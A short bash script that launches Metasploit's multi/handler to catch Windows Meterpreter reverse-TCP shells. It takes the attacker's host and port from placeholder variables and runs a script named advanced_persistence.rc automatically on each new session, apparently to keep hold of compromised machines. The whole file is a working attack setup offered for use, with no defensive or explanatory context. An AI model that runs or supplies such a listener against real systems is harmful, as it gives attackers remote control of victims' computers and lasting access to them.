#!/bin/bash

LHOST="ip"
LPORT="port"
AUTORUNSCRIPT="/cale/catre/advanced_persistence.rc"

msfconsole -q -x "
use exploit/multi/handler;
set payload windows/meterpreter/reverse_tcp;
set LHOST $LHOST;
set LPORT $LPORT;
set AutoRunScript $AUTORUNSCRIPT;
exploit -j;
"
